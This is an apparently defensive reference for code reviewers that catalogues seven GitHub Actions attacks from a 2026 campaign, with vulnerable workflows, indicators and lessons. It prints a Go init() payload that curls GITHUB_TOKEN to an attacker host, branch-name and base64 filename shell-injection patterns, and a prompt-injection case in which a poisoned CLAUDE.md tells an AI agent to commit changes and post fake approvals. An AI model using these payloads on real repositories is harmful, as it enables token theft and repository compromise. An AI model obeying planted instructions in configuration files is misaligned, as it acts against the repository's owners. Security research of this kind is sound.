> AAS import adaptation (2026-10-14): `UNTRUSTED_REMOTE_EXECUTION` is a non-operational marker for downloading an untrusted payload and executing it in a shell. Attack flows remain illustrative; original delivery strings are available in the pinned upstream source recorded in `UPSTREAM-NOTICE.md`.

# Real-World GitHub Actions Attacks

## Overview

This reference documents 7 attacks from the HackerBot Claw campaign (February-March 2026), which targeted high-profile open source repositories using GitHub Actions exploitation techniques. These are real, documented attacks — use them to calibrate severity and validate findings.

---

## Attack Timeline

| Date (UTC) | Target | Stars | Method | Outcome |
|------------|--------|-------|--------|---------|
| Feb 27, 05:14 | microsoft/ai-discovery-agent | — | Branch name injection | RCE likely |
| Feb 27, 05:26 | DataDog/datadog-iac-scanner | — | Filename injection | RCE confirmed |
| Feb 28, 00:57 | avelino/awesome-go | 140k+ | Go init() injection | Token exfiltration |
| Feb 28, 03:28 | aquasecurity/trivy | 25k+ | PAT theft via local action | Full repo compromise |
| Feb 28, 05:26 | ambient-code/platform | — | AI prompt injection | Blocked by Claude |
| Feb 28, 18:28 | project-akri/akri | — | Script injection via comment | RCE confirmed |
| Mar 2, 05:57 | RustPython/RustPython | — | Base64 branch injection | Partial execution |

The upstream report evolved and contains differing aggregate counts. Treat this as a case-study index, not a measured general success rate; verify linked primary incident evidence for each finding.

---

## Attack 1: awesome-go — Go init() Injection

**Category:** Pwn Request
**Stars:** 140,000+

### Vulnerable Workflow

```yaml
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}
  - run: go run ./.github/scripts/check-quality/
```

### Attack

The attacker opened 6 PRs (Feb 28, 18:03-18:14 UTC) that modified Go files under `.github/scripts/check-quality/`. Each contained an `init()` function:

```go
func init() {
    _ = exec.Command("bash", "-c",
        `curl -s -H "Authorization: Bearer $GITHUB_TOKEN" \
        -d "token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY" \
        https://recv.hackmoltrepeat.com/ && \
        UNTRUSTED_REMOTE_EXECUTION`).Run()
}
```

### Indicators

- Build logs showed 5m37s execution time for quality checks (normally seconds)
- `GITHUB_TOKEN` with write permissions was exfiltrated
- 6 PRs in 11 minutes from the same attacker

### Lesson

Go `init()` functions are invisible to casual review — they execute before `main()` without being called. `go run` and executed `go test` binaries run package init functions; `go build` compiles/links them without executing init (other build-time tooling/cgo may still execute commands).

---

## Attack 2: trivy — PAT Theft and Full Repo Compromise

**Category:** Credential Escalation
**Stars:** 25,000+

### Vulnerable Workflow

```yaml
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.ref }}
  - uses: ./.github/actions/setup-go/action.yaml  # FROM FORK
```

### Attack

The attacker modified `.github/actions/setup-go/action.yaml` in the fork to inject:

```bash
UNTRUSTED_REMOTE_EXECUTION
```

Because `pull_request_target` runs fork code with target repo secrets, the classic PAT (`AUTO_COMMIT_PAT`) was stolen.

### Post-Exploitation (Feb 28, 03:47 UTC)

With the stolen PAT, the attacker:
1. Renamed repository to `aquasecurity/private-trivy` and made it private
2. Deleted all GitHub Releases (versions 0.27.0 through 0.69.1)
3. Pushed malicious artifact to trivy's VSCode extension on Open VSIX marketplace
4. Pushed vandalism commit directly to main branch

### Indicators

- "Set up Go" step took 5+ minutes (normally seconds)
- `curl` command visible in build logs
- Repository briefly disappeared (renamed/privatized)

### Lesson

This is the maximum-impact scenario: a classic PAT grants access to ALL repositories the user can access. Even "fine-grained" PATs can be devastating if scoped too broadly. **Never expose PATs to fork code.**

---

## Attack 3: microsoft/ai-discovery-agent — Branch Name Injection

**Category:** Expression Injection
**Target:** Microsoft repository

### Vulnerable Workflow

```yaml
- name: Save format request data
  run: |
    echo "${{ steps.pr_info.outputs.pr_head_ref }}" > ./format-request/pr_head_ref
```

### Attack

Branch name used as payload:
```
dev$(UNTRUSTED_REMOTE_EXECUTION)
```

Breakdown:
- `${IFS}` becomes a space character (Internal Field Separator)
- `$({curl,-sSfL,...})` is brace expansion + command substitution
- Pipe to `bash` executes downloaded script

### Indicators

- 2m38s execution gap in "Save format request data" step (Feb 27, 05:14 UTC)
- Downstream workflow file corrupted with curl output instead of branch name

### Lesson

Branch names are attacker-controlled and can contain shell metacharacters. Always use environment variables, never direct `${{ }}` in `run:` blocks.

---

## Attack 4: DataDog/datadog-iac-scanner — Filename Injection

**Category:** Expression Injection
**Target:** DataDog repository

### Attack

Base64-encoded shell commands embedded in filenames:

```
documentation/rules/$(echo${IFS}Y3VybCAtc1NmTCBoYWNr...${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash).md
```

When the workflow iterated over modified files using `${{ }}`, the filename was interpreted as a shell command.

### Response

DataDog deployed emergency fixes within 9 hours (PR #9, Feb 27). Build logs showed base64 decoding errors with 2.5-minute execution gap, confirming shell injection fired.

### Lesson

File paths from PRs are attacker-controlled. When a workflow lists or iterates over changed files, those paths must never flow through `${{ }}` into `run:` blocks.

---

## Attack 5: ambient-code/platform — AI Prompt Injection

**Category:** AI Config Poisoning
**Target:** Repository using Claude Code Action

### Vulnerable Configuration

```yaml
on: pull_request_target
permissions:
  contents: write
env:
  allowed_non_write_users: '*'
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.ref }}
  - uses: anthropics/claude-code-action@v1
```

### Attack

The attacker replaced `CLAUDE.md` with instructions directing Claude to commit unauthorized changes, modify README, and post fake approval comments.

### Outcome

**Blocked.** Claude identified both injection attempts immediately, classifying it as a "textbook AI agent supply-chain attack via poisoned project-level instructions." The workflow configuration was still vulnerable — the defense was the AI agent's detection capability, not the workflow design.

### Lesson

AI agent configuration files (`CLAUDE.md`, `AGENTS.md`, `.cursorrules`) are a new attack surface. Protect them with CODEOWNERS and mandatory review. Don't rely solely on AI detection — fix the workflow configuration.

---

## Attack 6: project-akri — Comment-Triggered Script Injection

**Category:** Unauthorized Command Execution
**Target:** CNCF project

### Vulnerable Workflow

```yaml
on: issue_comment
jobs:
  version:
    if: |
      github.event.issue.pull_request &&
      contains(github.event.comment.body, '/version')
    # Missing: author_association check
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.ref }}
      - run: ./version.sh -u -n
```

### Attack

1. Attacker opened PR modifying `version.sh` to inject payload at the top:
   ```bash
   #!/usr/bin/env bash
   UNTRUSTED_REMOTE_EXECUTION
   check_file_version()  # Original code continues
   ```
2. Attacker commented `/version minor` on the PR
3. Workflow triggered without authorization check
4. Fork's `version.sh` executed with repo permissions

### Indicators

- Workflow run 22526467048 (Feb 28)
- "Update version minor" step succeeded before failing at authentication

### Lesson

`issue_comment` workflows must check `author_association`. Without it, any GitHub user can trigger privileged operations via comments on public repos.

---

## Attack 7: RustPython — Base64 Branch Name Injection

**Category:** Expression Injection
**Target:** RustPython project

### Attack

Similar to the Microsoft attack but using base64-encoded payload in the branch name. The attack achieved partial execution before being detected.

### Lesson

Base64 encoding is a common evasion technique for branch name and filename injection. The decoded payload is the same `UNTRUSTED_REMOTE_EXECUTION` pattern.

---

## Common Patterns Across All Attacks

1. **Same attacker infrastructure:** All attacks used `hackmoltrepeat.com` for payload delivery
2. **Same payload delivery:** `UNTRUSTED_REMOTE_EXECUTION` pattern in every attack
3. **Rapid iteration:** Multiple targets hit within days (Feb 27 - Mar 2)
4. **Targeting popular repos:** Focused on high-star-count repos for maximum impact
5. **Exploiting `pull_request_target`:** 4 of 7 attacks used this trigger
6. **Expression injection:** 3 of 7 attacks used `${{ }}` injection

---

## Using This Reference

When you confirm a finding in a review, reference the most similar real-world attack:

- Pwn request → awesome-go or trivy (depending on credential scope)
- Expression injection → microsoft/ai-discovery-agent or DataDog
- Comment command → project-akri
- AI config poisoning → ambient-code/platform
- Credential theft → trivy (worst-case scenario)

Include the real-world precedent in your finding to help stakeholders understand the concrete risk.

---

## References

- [StepSecurity: HackerBot Claw — GitHub Actions Exploitation](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
- [Aqua Security: Trivy incident response](https://www.aquasec.com/blog/trivy-github-repository-compromised/)
